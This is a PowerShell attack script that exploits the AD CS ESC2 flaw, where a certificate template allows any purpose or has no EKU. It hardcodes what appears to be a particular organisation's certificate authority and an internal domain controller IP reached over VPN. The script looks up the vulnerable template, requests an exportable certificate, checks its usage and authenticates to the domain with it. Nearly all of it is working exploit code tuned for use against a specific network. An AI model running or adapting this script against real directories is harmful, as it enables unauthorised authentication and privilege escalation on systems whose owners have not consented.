<#
.SYNOPSIS
    AD CS ESC2 - Any Purpose / No EKU Template (LOLBAS).
.DESCRIPTION
    Exploits templates with Any Purpose OID or no EKU restrictions.
    The issued certificate can be used for Client Authentication.
    MODIFIED: Hardcoded values, LDAPFilter for spaces in cn, template passed
    as -Attrib at submit time (not in INF) for non-domain-joined machines over VPN.
#>

[CmdletBinding()]
param(
    [string]$PFXPassword,
    [string]$OutputDir = "$env:TEMP\adcs-ops",
    [ValidateSet('Schannel','PKINIT','Both')] [string]$AuthMethod = 'Both',
    [switch]$SkipAuth
)

# ============================================================================
#  HARDCODED VALUES — edit these, no user input needed
# ============================================================================
$CAConfig     = "ILTLVNT151.ness.com\Ness IL CA SHA256"  # CA config string for SHA256 CA
$TemplateName = "Machine"                                    # cn value from ADExplorer
$DCTarget     = "172.26.106.7"                              # DC IP reachable over VPN
# ============================================================================

$ErrorActionPreference = 'Stop'
if (-not $PFXPassword) { $PFXPassword = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 20 | ForEach-Object { [char]$_ }) }
if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

$_dir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Definition }
. "$_dir\adcs-common.ps1"

Write-Host ""
Write-Host "  AD CS LOLBAS - ESC2 Standalone" -ForegroundColor White
Write-Host "  --------------------------------" -ForegroundColor DarkGray
Write-Host ""

Write-Banner "ESC2" "Any Purpose / No EKU Template"

# STAGE 1: RECON
Write-Stage -Number 1 -Name "RECONNAISSANCE"
Write-Host "    [>] Target CA   : $CAConfig" -ForegroundColor Gray
Write-Host "    [>] Template    : $TemplateName" -ForegroundColor Gray
Write-Host "    [>] DC Target   : $DCTarget" -ForegroundColor Gray

# Get AD context with explicit DC for non-domain-joined machines over VPN
if ($DCTarget) {
    $ctx = Get-ADContext -Server $DCTarget
} else {
    $ctx = Get-ADContext
}

# Template lookup via LDAPFilter — handles spaces in cn reliably
# PowerShell -Filter breaks on values with spaces; -LDAPFilter does not
$ldapFilter = "(cn=$TemplateName)"
if ($DCTarget) {
    $tpl = Get-ADObject -SearchBase $ctx.TemplateBase -LDAPFilter $ldapFilter `
        -Properties 'cn','displayName','pKIExtendedKeyUsage' `
        -Server $DCTarget -ErrorAction SilentlyContinue

    if (-not $tpl) {
        $tpl = Get-ADObject -SearchBase $ctx.TemplateBase -LDAPFilter "(displayName=$TemplateName)" `
            -Properties 'cn','displayName','pKIExtendedKeyUsage' `
            -Server $DCTarget -ErrorAction SilentlyContinue
    }
} else {
    $tpl = Get-ADObject -SearchBase $ctx.TemplateBase -LDAPFilter $ldapFilter `
        -Properties 'cn','displayName','pKIExtendedKeyUsage' `
        -ErrorAction SilentlyContinue

    if (-not $tpl) {
        $tpl = Get-ADObject -SearchBase $ctx.TemplateBase -LDAPFilter "(displayName=$TemplateName)" `
            -Properties 'cn','displayName','pKIExtendedKeyUsage' `
            -ErrorAction SilentlyContinue
    }
}

# Use cn exactly as stored in AD for certreq
$TemplateInternalName = if ($tpl) { $tpl.cn } else { $TemplateName }
Write-Host "    [>] Resolved cn : $TemplateInternalName" -ForegroundColor Gray

if (-not $tpl) {
    Write-Host "    [-] Template '$TemplateName' not found" -ForegroundColor Red
    Write-Host "    [i] Checked DC: $DCTarget" -ForegroundColor Yellow
    exit 1
}

# Check EKU — ESC2 is Any Purpose (OID 2.5.29.37.0) or empty EKU
$ekus = $tpl.pKIExtendedKeyUsage
if (-not $ekus -or $ekus -contains '2.5.29.37.0') {
    Write-Host "    [+] ESC2 confirmed — Any Purpose or No EKU" -ForegroundColor Green
} else {
    Write-Host "    [i] EKUs present: $($ekus -join ', ')" -ForegroundColor Yellow
}

Write-Stage -Number 1 -Name "RECONNAISSANCE" -Status 'COMPLETE'

# STAGE 2: POSITION
Write-Stage -Number 2 -Name "POSITIONING" -Status 'SKIPPED'
Write-Host "    [i] No prerequisites - direct exploitation" -ForegroundColor Gray

# STAGE 3: REQUEST
Write-Host ""
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST"

# Template passed as -Attrib at submit time, NOT in the INF
# Non-domain-joined machines cannot resolve template names locally;
# passing at submission time goes straight to the CA over VPN — no local lookup needed
$inf = New-CertRequestINF -Subject "CN=$env:USERNAME" `
    -OutFile "$OutputDir\esc2.inf" -Exportable
$result = Invoke-CertRequest -INFFile $inf -CA $CAConfig -Prefix "esc2" `
    -Attrib "CertificateTemplate:$TemplateInternalName"

if (-not $result.Success) {
    Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'FAILED'; exit 1
}
Write-Stage -Number 3 -Name "CERTIFICATE REQUEST" -Status 'COMPLETE'

# STAGE 4: VERIFY
Write-Host ""
Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION"
Write-Host "    [i] Certificate has unrestricted EKU - usable for Client Auth" -ForegroundColor Cyan
$certDump = certutil -dump $result.CerFile 2>$null
$ekuLine = $certDump | Select-String 'Enhanced Key Usage' | Select-Object -First 1
if ($ekuLine) {
    Write-Host "    [+] EKU: $($ekuLine.Line.Trim())" -ForegroundColor Green
}
Write-Stage -Number 4 -Name "CERTIFICATE VERIFICATION" -Status 'COMPLETE'

# STAGE 5: AUTHENTICATE
Invoke-AuthStage -PFXFile $result.PFXFile -PFXPass $PFXPassword -DC $DCTarget

Write-Host ""
Write-Host "  Complete. Artifacts in: $OutputDir" -ForegroundColor Gray
Write-Host ""
